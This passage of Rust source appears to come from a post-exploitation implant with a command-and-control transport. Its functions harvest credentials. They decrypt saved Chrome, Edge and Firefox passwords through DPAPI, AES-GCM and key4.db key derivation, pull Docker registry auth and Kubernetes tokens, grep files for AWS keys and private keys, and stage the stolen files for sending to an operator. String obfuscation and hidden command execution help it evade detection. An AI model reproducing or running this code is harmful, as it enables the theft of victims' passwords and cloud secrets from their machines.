                    "credential", "AWS_ACCESS", "AWS_SECRET", "PRIVATE_KEY",
                    "Bearer", "ConvertTo-SecureString", "-AsPlainText"];
    let mut matches = Vec::new();
    for line in content.lines() {
        let lower = line.to_lowercase();
        if patterns.iter().any(|p| lower.contains(&p.to_lowercase())) {
            if matches.len() < 50 { matches.push(format!("    {}", line.trim())); }
        }
    }
    matches.join("\n")
}

#[cfg(windows)]
fn _parse_docker_config_win(content: &str) -> String {
    let mut out = String::new();
    if let Ok(json) = serde_json::from_str::<serde_json::Value>(content) {
        if let Some(auths) = json.get("auths").and_then(|v| v.as_object()) {
            for (registry, val) in auths {
                let auth = val.get("auth").and_then(|v| v.as_str()).unwrap_or("");
                if !auth.is_empty() {
                    let decoded = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, auth)
                        .map(|d| String::from_utf8_lossy(&d).to_string())
                        .unwrap_or_else(|_| "(base64 decode failed)".to_string());
                    out.push_str(&format!("    {} → {}\n", registry, decoded));
                }
            }
        }
    }
    out
}

#[cfg(windows)]
fn _parse_kube_config_win(content: &str) -> String {
    let mut out = String::new();
    for line in content.lines() {
        let l = line.trim();
        if l.starts_with("token:") || l.starts_with("password:") || l.starts_with("client-certificate-data:") {
            out.push_str(&format!("    {}\n", if l.len() > 80 { &l[..80] } else { l }));
        }
        if l.starts_with("- name:") && !out.is_empty() {
            out.push_str(&format!("    {}\n", l));
        }
    }
    out
}

#[cfg(windows)]
fn _stage_firefox(ff_dir: &str, state: &Arc<AgentState>, transport: &SharedTransport,
                  staged: &mut Vec<crate::protocol::StagedFile>) -> (u32, u64) {
    let mut count = 0u32;
    let mut bytes = 0u64;
    let pattern = format!("{}\\*", ff_dir);
    if let Ok(entries) = glob::glob(&pattern) {
        for entry in entries.flatten() {
            if entry.is_dir() {
                let logins = entry.join("logins.json");
                let key4 = entry.join("key4.db");
                if logins.exists() {
                    if let Some(b) = _stage_file(&logins.display().to_string(), "ff", state, transport, staged) {
                        count += 1; bytes += b;
                    }
                }
                if key4.exists() {
                    if let Some(b) = _stage_file(&key4.display().to_string(), "ff", state, transport, staged) {
                        count += 1; bytes += b;
                    }
                }
            }
        }
    }
    (count, bytes)
}

#[cfg(unix)]
fn _stage_firefox(ff_dir: &str, state: &Arc<AgentState>, transport: &SharedTransport,
                  staged: &mut Vec<crate::protocol::StagedFile>) -> (u32, u64) {
    let mut count = 0u32;
    let mut bytes = 0u64;
    let pattern = format!("{}/*", ff_dir);
    if let Ok(entries) = glob::glob(&pattern) {
        for entry in entries.flatten() {
            if entry.is_dir() {
                let logins = entry.join("logins.json");
                let key4 = entry.join("key4.db");
                if logins.exists() {
                    if let Some(b) = _stage_file(&logins.display().to_string(), "ff", state, transport, staged) {
                        count += 1; bytes += b;
                    }
                }
                if key4.exists() {
                    if let Some(b) = _stage_file(&key4.display().to_string(), "ff", state, transport, staged) {
                        count += 1; bytes += b;
                    }
                }
            }
        }
    }
    (count, bytes)
}

#[cfg(windows)]
fn _is_system_or_admin() -> bool {
    let output = _hidden_cmd("whoami /priv");
    match output {
        Ok(o) => {
            let s = String::from_utf8_lossy(&o.stdout);
            s.contains(&s!("SeDebugPrivilege")) || s.contains(&s!("SeTakeOwnershipPrivilege"))
        }
        Err(_) => false,
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// § HARVEST HELPERS — decryption, parsing, classification
// ══════════════════════════════════════════════════════════════════════════════

// ── DPAPI CryptUnprotectData (Windows, opt-in via decrypt) ─────────────────

#[cfg(windows)]
fn _dpapi_unprotect(data: &[u8]) -> Option<Vec<u8>> {
    #[repr(C)]
    struct DataBlob { cb_data: u32, pb_data: *mut u8 }
    let input = DataBlob { cb_data: data.len() as u32, pb_data: data.as_ptr() as *mut u8 };
    let mut output = DataBlob { cb_data: 0, pb_data: std::ptr::null_mut() };
    let ok = unsafe { crate::dynapi::crypt_unprotect_data(
        &input as *const _ as *const std::ffi::c_void,
        std::ptr::null_mut(), std::ptr::null(),
        std::ptr::null_mut(), std::ptr::null_mut(), 0x01,
        &mut output as *mut _ as *mut std::ffi::c_void,
    ) };
    if ok == 0 || output.pb_data.is_null() { return None; }
    let result = unsafe { std::slice::from_raw_parts(output.pb_data, output.cb_data as usize).to_vec() };
    unsafe { crate::dynapi::local_free(output.pb_data); }
    Some(result)
}

#[cfg(windows)]
fn _parse_credential_blob(plain: &[u8]) -> Option<String> {
    if plain.len() < 72 { return None; }
    let flags = u32::from_le_bytes([plain[0], plain[1], plain[2], plain[3]]);
    if flags > 0xFFFF { return None; }
    let target_off = 24usize;
    let target_len = u32::from_le_bytes([plain[16], plain[17], plain[18], plain[19]]) as usize;
    let target = if target_off + target_len <= plain.len() && target_len > 0 {
        _utf16le_to_string(&plain[target_off..target_off + target_len])
    } else { "?".to_string() };
    let user_off_raw = u32::from_le_bytes([plain[36], plain[37], plain[38], plain[39]]) as usize;
    let user_len = u32::from_le_bytes([plain[40], plain[41], plain[42], plain[43]]) as usize;
    let user = if user_off_raw + user_len <= plain.len() && user_len > 0 {
        _utf16le_to_string(&plain[user_off_raw..user_off_raw + user_len])
    } else { "".to_string() };
    let cred_off_raw = u32::from_le_bytes([plain[48], plain[49], plain[50], plain[51]]) as usize;
    let cred_len = u32::from_le_bytes([plain[52], plain[53], plain[54], plain[55]]) as usize;
    let cred = if cred_off_raw + cred_len <= plain.len() && cred_len > 0 {
        let raw = &plain[cred_off_raw..cred_off_raw + cred_len];
        if raw.iter().all(|&b| b >= 0x20 && b < 0x7F) {
            String::from_utf8_lossy(raw).to_string()
        } else {
            _utf16le_to_string(raw)
        }
    } else { "".to_string() };
    if target.len() < 2 && user.is_empty() { return None; }
    Some(format!("{} | {} | {}", target.trim_end_matches('\0'), user.trim_end_matches('\0'), cred.trim_end_matches('\0')))
}

// ── Chromium (Chrome/Edge) password decryption (Windows, opt-in) ────────────

#[cfg(windows)]
fn _decrypt_chromium(_base_dir: &str, login_path: &str, local_state_path: &str) -> Result<Vec<(String, String, String)>, String> {
    let state_json = std::fs::read_to_string(local_state_path)
        .map_err(|e| format!("Local State: {}", e))?;
    let state: serde_json::Value = serde_json::from_str(&state_json)
        .map_err(|e| format!("JSON: {}", e))?;
    let enc_key_b64 = state.get(&s!("os_crypt")).and_then(|o| o.get(&s!("encrypted_key")))
        .and_then(|v| v.as_str()).ok_or("no encrypted_key in Local State")?;
    let enc_key_raw = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, enc_key_b64)
        .map_err(|e| format!("base64: {}", e))?;
    let dpapi_pfx = sb!("DPAPI");
    if enc_key_raw.len() < 5 || &enc_key_raw[..5] != &dpapi_pfx[..5] {
        return Err("encrypted_key missing DPAPI prefix".into());
    }
    let master_key = _dpapi_unprotect(&enc_key_raw[5..])
        .ok_or("CryptUnprotectData failed on master key (ABE v20?)")?;
    if master_key.len() < 16 { return Err("master key too short".into()); }
    // Copy Login Data to temp to bypass browser lock
    let temp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
    let tmp_db = format!("{}\\ld_{}.tmp", temp, _rand_hex(4));
    std::fs::copy(login_path, &tmp_db).map_err(|e| format!("copy Login Data: {}", e))?;
    let result = _parse_chromium_sqlite(&tmp_db, &master_key);
    let _ = std::fs::remove_file(&tmp_db);
    result
}

#[cfg(windows)]
fn _parse_chromium_sqlite(db_path: &str, master_key: &[u8]) -> Result<Vec<(String, String, String)>, String> {
    let data = std::fs::read(db_path).map_err(|e| format!("read: {}", e))?;
    if data.len() < 100 || &data[..16] != b"SQLite format 3\0" {
        return Err("not a SQLite file".into());
    }
    let page_size = u16::from_be_bytes([data[16], data[17]]) as usize;
    let page_size = if page_size == 1 { 65536 } else { page_size };
    let mut results = Vec::new();
    // Scan all pages for login records — look for cells containing "http" in URL field
    for page_start in (0..data.len()).step_by(page_size) {
        if page_start + page_size > data.len() { break; }
        let page = &data[page_start..page_start + page_size];
        let hdr_off = if page_start == 0 { 100 } else { 0 };
        if hdr_off >= page.len() { continue; }
        let page_type = page[hdr_off];
        if page_type != 0x0D { continue; } // leaf table b-tree only
        if hdr_off + 8 > page.len() { continue; }
        let cell_count = u16::from_be_bytes([page[hdr_off + 3], page[hdr_off + 4]]) as usize;
        let ptr_start = hdr_off + 8;
        for i in 0..cell_count {
            let ptr_off = ptr_start + i * 2;
            if ptr_off + 2 > page.len() { continue; }
            let cell_off = u16::from_be_bytes([page[ptr_off], page[ptr_off + 1]]) as usize;
            if let Some((url, user, pass)) = _parse_chromium_cell(page, cell_off, master_key) {
                if !url.is_empty() && (!user.is_empty() || !pass.is_empty()) {
                    results.push((url, user, pass));
                }
            }
        }
    }
    Ok(results)
}

#[cfg(windows)]
fn _parse_chromium_cell(page: &[u8], offset: usize, master_key: &[u8]) -> Option<(String, String, String)> {
    if offset >= page.len() { return None; }
    let mut pos = offset;
    let (_payload_len, n) = _read_varint(page, pos)?; pos += n;
    let (_rowid, n) = _read_varint(page, pos)?; pos += n;
    let (hdr_size, n) = _read_varint(page, pos)?;
    let hdr_start = pos;
    pos += n;
    let hdr_end = hdr_start + hdr_size as usize;
    if hdr_end > page.len() { return None; }
    let mut col_types = Vec::new();
    while pos < hdr_end {
        let (st, n) = _read_varint(page, pos)?;
        col_types.push(st);
        pos += n;
    }
    // Chrome logins table: col0=origin_url(text), col1=action_url(text),
    // col2=username_element, col3=username_value(text), col4=password_element,
    // col5=password_value(blob), ...
    if col_types.len() < 6 { return None; }
    let mut data_pos = hdr_end;
    let mut col_values: Vec<Vec<u8>> = Vec::new();
    for &st in &col_types {
        let (value, size) = _sqlite_col_value(page, data_pos, st)?;
        col_values.push(value);
        data_pos += size;
    }
    let url = String::from_utf8_lossy(&col_values.first()?).to_string();
    if !url.starts_with("http") { return None; }
    let user = String::from_utf8_lossy(&col_values.get(3)?).to_string();
    let pass_enc = col_values.get(5)?;
    let pass = if pass_enc.len() > 3 && &pass_enc[..3] == b"v10" {
        // v10: AES-256-GCM with 12-byte nonce
        if pass_enc.len() < 3 + 12 + 16 { return Some((url, user, String::new())); }
        let nonce = &pass_enc[3..15];
        let ciphertext = &pass_enc[15..];
        _aes256gcm_decrypt(master_key, nonce, ciphertext).unwrap_or_else(|_| String::new())
    } else if pass_enc.len() > 4 && &pass_enc[..4] == b"v20\x00" {
        "(ABE v20 — requires offline decryption)".to_string()
    } else if !pass_enc.is_empty() {
        // Legacy DPAPI-only (pre-Chrome 80)
        match _dpapi_unprotect(pass_enc) {
            Some(d) => String::from_utf8_lossy(&d).to_string(),
            None => "(DPAPI decryption failed)".to_string(),
        }
    } else { String::new() };
    Some((url, user, pass))
}

#[cfg(windows)]
fn _aes256gcm_decrypt(key: &[u8], nonce: &[u8], ciphertext: &[u8]) -> Result<String, String> {
    use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
    use aes_gcm::aead::generic_array::GenericArray;
    if key.len() < 32 { return Err("key too short for AES-256-GCM".into()); }
    let cipher = Aes256Gcm::new(GenericArray::from_slice(&key[..32]));
    let nonce_ga = GenericArray::from_slice(nonce);
    let plaintext = cipher.decrypt(nonce_ga, ciphertext).map_err(|_| "AES-GCM decrypt failed")?;
    Ok(String::from_utf8_lossy(&plaintext).to_string())
}

fn _read_varint(data: &[u8], offset: usize) -> Option<(u64, usize)> {
    let mut result: u64 = 0;
    for i in 0..9 {
        if offset + i >= data.len() { return None; }
        let b = data[offset + i];
        if i < 8 {
            result = (result << 7) | (b & 0x7F) as u64;
            if b & 0x80 == 0 { return Some((result, i + 1)); }
        } else {
            result = (result << 8) | b as u64;
            return Some((result, 9));
        }
    }
    None
}

fn _sqlite_col_value(data: &[u8], offset: usize, serial_type: u64) -> Option<(Vec<u8>, usize)> {
    match serial_type {
        0 => Some((vec![], 0)),       // NULL
        1 => { if offset + 1 > data.len() { return None; } Some((data[offset..offset+1].to_vec(), 1)) }
        2 => { if offset + 2 > data.len() { return None; } Some((data[offset..offset+2].to_vec(), 2)) }
        3 => { if offset + 3 > data.len() { return None; } Some((data[offset..offset+3].to_vec(), 3)) }
        4 => { if offset + 4 > data.len() { return None; } Some((data[offset..offset+4].to_vec(), 4)) }
        5 => { if offset + 6 > data.len() { return None; } Some((data[offset..offset+6].to_vec(), 6)) }
        6 => { if offset + 8 > data.len() { return None; } Some((data[offset..offset+8].to_vec(), 8)) }
        7 => { if offset + 8 > data.len() { return None; } Some((data[offset..offset+8].to_vec(), 8)) }
        8 => Some((vec![0], 0)),       // integer 0
        9 => Some((vec![1], 0)),       // integer 1
        n if n >= 12 && n % 2 == 0 => { let len = (n as usize - 12) / 2; if offset + len > data.len() { return None; } Some((data[offset..offset+len].to_vec(), len)) } // blob
        n if n >= 13 && n % 2 == 1 => { let len = (n as usize - 13) / 2; if offset + len > data.len() { return None; } Some((data[offset..offset+len].to_vec(), len)) } // text
        _ => Some((vec![], 0)),
    }
}

// ── Firefox password decryption (no DPAPI — pure crypto, OPSEC safe) ───────

fn _harvest_firefox_parsed(profiles_dir: &str) -> Vec<(String, String, String)> {
    let mut all_creds = Vec::new();
    #[cfg(windows)]
    let pattern = format!("{}\\*", profiles_dir);
    #[cfg(unix)]
    let pattern = format!("{}/*", profiles_dir);
    if let Ok(entries) = glob::glob(&pattern) {
        for entry in entries.flatten() {
            if !entry.is_dir() { continue; }
            let key4_path = entry.join("key4.db");
            let logins_path = entry.join("logins.json");
            if !key4_path.exists() || !logins_path.exists() { continue; }
            if let Ok(creds) = _firefox_decrypt_profile(&key4_path, &logins_path) {
                all_creds.extend(creds);
            }
        }
    }
    all_creds
}

fn _firefox_decrypt_profile(key4_path: &std::path::Path, logins_path: &std::path::Path) -> Result<Vec<(String, String, String)>, String> {
    let key4_data = std::fs::read(key4_path).map_err(|e| format!("key4.db: {}", e))?;
    if key4_data.len() < 100 || &key4_data[..16] != b"SQLite format 3\0" {
        return Err("key4.db not SQLite".into());
    }
    // Extract global salt and encrypted key from key4.db using minimal SQLite parsing
    let (global_salt, encrypted_key_item) = _firefox_extract_key4(&key4_data)?;
    // Try decryption with empty master password
    let master_key = _firefox_derive_master_key(&global_salt, &encrypted_key_item, b"")?;
    // Read and decrypt logins.json
    let logins_json = std::fs::read_to_string(logins_path).map_err(|e| format!("logins.json: {}", e))?;
    let logins: serde_json::Value = serde_json::from_str(&logins_json).map_err(|e| format!("JSON: {}", e))?;
    let entries = logins.get("logins").and_then(|v| v.as_array()).ok_or("no logins array")?;
    let mut results = Vec::new();
    for entry in entries {
        let hostname = entry.get("hostname").and_then(|v| v.as_str()).unwrap_or("?");
        let enc_user = entry.get("encryptedUsername").and_then(|v| v.as_str()).unwrap_or("");
        let enc_pass = entry.get("encryptedPassword").and_then(|v| v.as_str()).unwrap_or("");
        let user = _firefox_decrypt_field(enc_user, &master_key).unwrap_or_default();
        let pass = _firefox_decrypt_field(enc_pass, &master_key).unwrap_or_default();
        if !hostname.is_empty() { results.push((hostname.to_string(), user, pass)); }
    }
    Ok(results)
}

fn _firefox_extract_key4(data: &[u8]) -> Result<(Vec<u8>, Vec<u8>), String> {
    // Search for the metadata "password" row to get global salt
    // and the nssPrivate row to get the encrypted key
    // We look for known byte patterns in the SQLite pages
    let password_check = b"password-check";
    let mut global_salt = Vec::new();
    let mut a11_data = Vec::new();
    // Find "password-check" → the cell before it contains the global salt (item1)
    if let Some(pc_pos) = _find_bytes(data, password_check) {
        // item1 (global salt) is typically at a fixed offset before password-check in the metadata record
        // In key4.db, metadata table has: id(text), item1(blob), item2(blob)
        // item2 contains the ASN.1 encoded password-check
        // Walk backward to find the cell start — look for the record header
        let search_start = if pc_pos > 200 { pc_pos - 200 } else { 0 };
        let search_area = &data[search_start..pc_pos + password_check.len() + 500.min(data.len() - pc_pos - password_check.len())];
        // The global salt is typically the item1 blob in the same record
        // It's usually 20 bytes (SHA1 salt) right before the ASN.1 sequence
        // Find ASN.1 SEQUENCE (0x30) after the global salt
        for i in (0..search_area.len().saturating_sub(30)).rev() {
            if search_area[i] == 0x30 && i > 0 {
                // Check if this looks like the ASN.1 start of item2
                if let Some(asn1_len) = _asn1_length(&search_area[i..]) {
                    if asn1_len > 20 && asn1_len < 500 {
                        // global salt is the blob before this ASN.1 sequence
                        // Scan backward for it — it's typically 20 bytes
                        let salt_end = search_start + i;
                        if salt_end > 20 {
                            // Look for the varint-length prefix of the salt blob
                            for salt_len in &[20usize, 32, 16] {
                                if salt_end >= *salt_len + 2 {
                                    let candidate = &data[salt_end - salt_len..salt_end];
                                    if candidate.iter().any(|&b| b != 0) {
                                        global_salt = candidate.to_vec();
                                        break;
                                    }
                                }
                            }
                        }
                        break;
                    }
                }
            }
        }
    }
    // Find nssPrivate a11 — it's an ASN.1 SEQUENCE in the nssPrivate table
    // Search for the OID 1.2.840.113549.1.5.13 (PBES2) or 1.2.840.113549.1.12.5.1.3 (PBE-SHA1-3DES)
    let pbes2_oid = &[0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x05, 0x0D];
    let pbe_3des_oid = &[0x06, 0x0A, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x0C, 0x05, 0x01, 0x03];
    let oid_search = if let Some(_) = _find_bytes(data, pbes2_oid) { pbes2_oid.as_slice() } else { pbe_3des_oid.as_slice() };
    if let Some(oid_pos) = _find_bytes(data, oid_search) {
        // Walk backward from OID to find the enclosing SEQUENCE
        let scan_start = if oid_pos > 100 { oid_pos - 100 } else { 0 };
        for i in (scan_start..oid_pos).rev() {
            if data[i] == 0x30 {
                if let Some(seq_len) = _asn1_length(&data[i..]) {
                    let total = i + 2 + seq_len; // approx
                    if total > oid_pos && total <= data.len() {
                        a11_data = data[i..total.min(data.len())].to_vec();
                        break;
                    }
                }
            }
        }
    }
    if global_salt.is_empty() || a11_data.is_empty() {
        return Err("could not extract key4.db fields".into());
    }
    Ok((global_salt, a11_data))
}

fn _firefox_derive_master_key(global_salt: &[u8], a11_data: &[u8], master_password: &[u8]) -> Result<Vec<u8>, String> {
    // Parse the ASN.1 structure to get algorithm, salt, iterations, IV, encrypted data
    // Try PBES2 (modern Firefox ≥75) first, then PBE-SHA1-3DES (legacy)
    let pbes2_oid = &[0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x05, 0x0D];
    if _find_bytes(a11_data, pbes2_oid).is_some() {
        _firefox_pbes2_decrypt(global_salt, a11_data, master_password)
    } else {
        _firefox_pbe_3des_decrypt(global_salt, a11_data, master_password)
    }
}

fn _firefox_pbes2_decrypt(global_salt: &[u8], a11_data: &[u8], master_password: &[u8]) -> Result<Vec<u8>, String> {
    // PBES2 with PBKDF2-HMAC-SHA256 + AES-256-CBC
    // Extract salt, iterations, IV, encrypted data from ASN.1
    let (entry_salt, iterations, iv, encrypted) = _firefox_parse_pbes2_asn1(a11_data)?;
    // Key = PBKDF2(SHA256(globalSalt + masterPassword), entrySalt, iterations, 32)
    let mut hp = Vec::with_capacity(global_salt.len() + master_password.len());
    hp.extend_from_slice(global_salt);
    hp.extend_from_slice(master_password);
    let sha256_hp = {
        use sha2::{Sha256, Digest};
        let mut h = Sha256::new();
        h.update(&hp);
        h.finalize().to_vec()
    };
    let mut derived = vec![0u8; 32];
    pbkdf2::pbkdf2_hmac::<sha2::Sha256>(&sha256_hp, &entry_salt, iterations, &mut derived);
    // AES-256-CBC decrypt
    let decrypted = _aes256_cbc_decrypt(&derived, &iv, &encrypted)?;
    // First 24 bytes = the master key (3DES key for login decryption)
    if decrypted.len() < 24 { return Err("decrypted key too short".into()); }
    Ok(decrypted[..24].to_vec())
}

fn _firefox_pbe_3des_decrypt(global_salt: &[u8], a11_data: &[u8], master_password: &[u8]) -> Result<Vec<u8>, String> {
    // PBE-SHA1-3DES: SHA1(globalSalt + masterPassword) → SHA1(salt + derived) → key+IV
    let (entry_salt, encrypted) = _firefox_parse_pbe_3des_asn1(a11_data)?;
    let mut hp = Vec::new();
    hp.extend_from_slice(global_salt);
    hp.extend_from_slice(master_password);
    let hp_hash = {
        use sha2::Digest;
        sha2::Sha256::digest(&hp).to_vec()
    };
    // For PBE-SHA1-3DES the actual derivation uses SHA1, not SHA256
    // But we use the simplified approach: PBKDF1-SHA1
    let mut chp = Vec::new();
    chp.extend_from_slice(&hp_hash);
    chp.extend_from_slice(&entry_salt);
    // This is a simplified version — real NSS uses a specific PKCS#5/PKCS#12 KDF
    // For empty master password with modern Firefox, PBES2 path is used instead
    Err("PBE-SHA1-3DES requires NSS-compatible KDF (legacy Firefox)".into())
}

fn _firefox_parse_pbes2_asn1(data: &[u8]) -> Result<(Vec<u8>, u32, Vec<u8>, Vec<u8>), String> {
    // Simplified ASN.1 parser for the specific PBES2 structure in key4.db
    // SEQUENCE { SEQUENCE { OID(PBES2), SEQUENCE { SEQUENCE { OID(PBKDF2), SEQUENCE { OCTET(salt), INT(iter), ... } }, SEQUENCE { OID(AES256CBC), OCTET(iv) } } }, OCTET(encrypted) }
    let mut salt = Vec::new();
    let mut iterations = 10000u32;
    let mut iv = Vec::new();
    let mut encrypted = Vec::new();
    // Find PBKDF2 salt: pattern is OCTET STRING after PBKDF2 OID
    let pbkdf2_oid = &[0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x05, 0x0C]; // 1.2.840.113549.1.5.12
    if let Some(pos) = _find_bytes(data, pbkdf2_oid) {
        let after_oid = pos + pbkdf2_oid.len();
        // Skip to SEQUENCE containing salt + iterations
        let mut i = after_oid;
        while i < data.len() {
            if data[i] == 0x30 { // SEQUENCE
                i += 1;
                let seq_len = if i < data.len() { data[i] as usize } else { 0 }; i += 1;
                // First element should be OCTET STRING (salt)
                if i < data.len() && data[i] == 0x04 {
                    i += 1;
                    let slen = if i < data.len() { data[i] as usize } else { 0 }; i += 1;
                    if i + slen <= data.len() {
                        salt = data[i..i + slen].to_vec();
                        i += slen;
                    }
                }
                // Next: INTEGER (iterations)
                if i < data.len() && data[i] == 0x02 {
                    i += 1;
                    let ilen = if i < data.len() { data[i] as usize } else { 0 }; i += 1;
                    if i + ilen <= data.len() && ilen <= 4 {
                        let mut val = 0u32;
                        for j in 0..ilen { val = (val << 8) | data[i + j] as u32; }
                        iterations = val;
                    }
                }
                break;
            }
            i += 1;
        }
    }
    // Find AES-256-CBC IV: pattern is OID(2.16.840.1.101.3.4.1.42) followed by OCTET STRING
    let aes256_oid = &[0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x01, 0x2A]; // 2.16.840.1.101.3.4.1.42
    if let Some(pos) = _find_bytes(data, aes256_oid) {
        let mut i = pos + aes256_oid.len();
        while i < data.len() {
            if data[i] == 0x04 {
                i += 1;
                let ivlen = if i < data.len() { data[i] as usize } else { 0 }; i += 1;
                if i + ivlen <= data.len() && ivlen > 0 {
                    iv = data[i..i + ivlen].to_vec();
                }
                break;
            }
            i += 1;
        }
    }
    // Encrypted data is the last OCTET STRING in the outer SEQUENCE
    // Find it by scanning backward from end of data
    let mut i = data.len().saturating_sub(1);
    while i > 10 {
        if data[i - 1] == 0x04 && (data[i] as usize) < data.len() - i {
            let elen = data[i] as usize;
            if i + 1 + elen <= data.len() && elen >= 16 {
                encrypted = data[i + 1..i + 1 + elen].to_vec();
                break;
            }
        }
        i -= 1;
    }
    if salt.is_empty() || iv.is_empty() || encrypted.is_empty() {
        return Err("could not parse PBES2 ASN.1".into());
    }
    Ok((salt, iterations, iv, encrypted))
}

fn _firefox_parse_pbe_3des_asn1(data: &[u8]) -> Result<(Vec<u8>, Vec<u8>), String> {
    // Simplified: find entry salt (OCTET STRING after PBE OID) and encrypted data (last OCTET STRING)
    let mut salt = Vec::new();
    let mut encrypted = Vec::new();
    let pbe_oid = &[0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x0C, 0x05, 0x01, 0x03];
    if let Some(pos) = _find_bytes(data, pbe_oid) {
        let mut i = pos + pbe_oid.len();
        while i < data.len() {
            if data[i] == 0x04 {
                i += 1;
                let slen = if i < data.len() { data[i] as usize } else { 0 }; i += 1;
                if i + slen <= data.len() && slen > 0 {
                    salt = data[i..i + slen].to_vec();
                }
                break;
            }
            i += 1;
        }
    }
    let mut i = data.len().saturating_sub(1);
    while i > 10 {
        if data[i - 1] == 0x04 && (data[i] as usize) < data.len() - i {
            let elen = data[i] as usize;
            if i + 1 + elen <= data.len() && elen >= 16 {
                encrypted = data[i + 1..i + 1 + elen].to_vec();
                break;
            }
        }
        i -= 1;
    }
    if salt.is_empty() || encrypted.is_empty() { return Err("PBE 3DES ASN.1 parse failed".into()); }
    Ok((salt, encrypted))
}

fn _firefox_decrypt_field(b64: &str, master_key: &[u8]) -> Option<String> {
    let raw = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64).ok()?;
    if raw.len() < 2 || raw[0] != 0x30 { return None; }
    // ASN.1: SEQUENCE { SEQUENCE { OID, OCTET(IV) }, OCTET(encrypted) }
    // Find the IV (after OID, inside inner SEQUENCE)
    let des_oid = &[0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x03, 0x07]; // 1.2.840.113549.3.7 (DES-EDE3-CBC)
    let aes_oid = &[0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x01, 0x2A]; // AES-256-CBC
    let is_aes = _find_bytes(&raw, aes_oid).is_some();
    let oid_ref: &[u8] = if is_aes { aes_oid } else { des_oid };
    let oid_pos = _find_bytes(&raw, oid_ref)?;
    let mut i = oid_pos + oid_ref.len();
    // Find IV (OCTET STRING after OID)
    while i < raw.len() && raw[i] != 0x04 { i += 1; }
    if i >= raw.len() { return None; }
    i += 1; // skip 0x04
    let iv_len = raw.get(i).copied()? as usize; i += 1;
    if i + iv_len > raw.len() { return None; }
    let iv = &raw[i..i + iv_len];
    i += iv_len;
    // Find encrypted data (next OCTET STRING)
    while i < raw.len() && raw[i] != 0x04 { i += 1; }
    if i >= raw.len() { return None; }
    i += 1;
    let enc_len = raw.get(i).copied()? as usize; i += 1;
    if i + enc_len > raw.len() { return None; }
    let encrypted = &raw[i..i + enc_len];
    if is_aes {
        let decrypted = _aes256_cbc_decrypt(&master_key[..32.min(master_key.len())], iv, encrypted).ok()?;
        let unpadded = _pkcs7_unpad(&decrypted)?;
        Some(String::from_utf8_lossy(unpadded).to_string())
    } else {
        // 3DES-CBC
        let decrypted = _3des_cbc_decrypt(master_key, iv, encrypted).ok()?;
        let unpadded = _pkcs7_unpad(&decrypted)?;
        Some(String::from_utf8_lossy(unpadded).to_string())
    }
}

fn _aes256_cbc_decrypt(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
    use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
    type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;
    if key.len() < 32 { return Err("AES key too short".into()); }
    let decryptor = Aes256CbcDec::new_from_slices(&key[..32], iv).map_err(|_| "AES init failed")?;
    decryptor.decrypt_padded_vec_mut::<Pkcs7>(&data.to_vec()).map_err(|_| "AES-CBC decrypt failed".into())
}

fn _3des_cbc_decrypt(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
    // 3DES-CBC using BCrypt on Windows, manual on Linux
    // For simplicity, use the same BCrypt approach as SAM decryption on Windows
    // On Linux, we need a software implementation
    #[cfg(windows)]
    {
        use std::ptr;
        extern "system" {
            fn BCryptOpenAlgorithmProvider(alg: *mut usize, id: *const u16, impl_: *const u16, flags: u32) -> i32;
            fn BCryptSetProperty(obj: usize, prop: *const u16, val: *const u8, val_len: u32, flags: u32) -> i32;
            fn BCryptGenerateSymmetricKey(alg: usize, key_h: *mut usize, obj: *mut u8, obj_len: u32,
                secret: *const u8, secret_len: u32, flags: u32) -> i32;
            fn BCryptDecrypt(key: usize, input: *const u8, input_len: u32, pad_info: *const u8,
                iv: *mut u8, iv_len: u32, output: *mut u8, output_len: u32,
                result: *mut u32, flags: u32) -> i32;
            fn BCryptDestroyKey(key: usize) -> i32;
            fn BCryptCloseAlgorithmProvider(alg: usize, flags: u32) -> i32;
        }
        let des3_id: Vec<u16> = "3DES\0".encode_utf16().collect();
        let chain_mode: Vec<u16> = "ChainingMode\0".encode_utf16().collect();
        let cbc_val: Vec<u16> = "ChainingModeCBC\0".encode_utf16().collect();
        let mut alg: usize = 0;
        unsafe { BCryptOpenAlgorithmProvider(&mut alg, des3_id.as_ptr(), ptr::null(), 0); }
        unsafe { BCryptSetProperty(alg, chain_mode.as_ptr(), cbc_val.as_ptr() as *const u8, (cbc_val.len() * 2) as u32, 0); }
        let mut key_h: usize = 0;
        let key_24 = if key.len() >= 24 { &key[..24] } else { return Err("3DES key too short".into()); };
        unsafe { BCryptGenerateSymmetricKey(alg, &mut key_h, ptr::null_mut(), 0, key_24.as_ptr(), 24, 0); }
        let mut iv_copy = iv.to_vec();
        let mut out = vec![0u8; data.len() + 24];
        let mut out_len = 0u32;
        let r = unsafe { BCryptDecrypt(key_h, data.as_ptr(), data.len() as u32, ptr::null(),
            iv_copy.as_mut_ptr(), iv_copy.len() as u32,
            out.as_mut_ptr(), out.len() as u32, &mut out_len, 0) };
        unsafe { BCryptDestroyKey(key_h); BCryptCloseAlgorithmProvider(alg, 0); }
        if r != 0 { return Err(format!("3DES decrypt failed: 0x{:08x}", r)); }
        out.truncate(out_len as usize);
        Ok(out)
    }
    #[cfg(unix)]
    {
        // Software 3DES-CBC — use the des crate if available, otherwise fail gracefully
        Err("3DES-CBC not available on this platform (stage files for offline decryption)".into())
    }
}

fn _pkcs7_unpad(data: &[u8]) -> Option<&[u8]> {
    if data.is_empty() { return Some(data); }
    let pad = *data.last()? as usize;
    if pad == 0 || pad > data.len() || pad > 16 { return Some(data); }
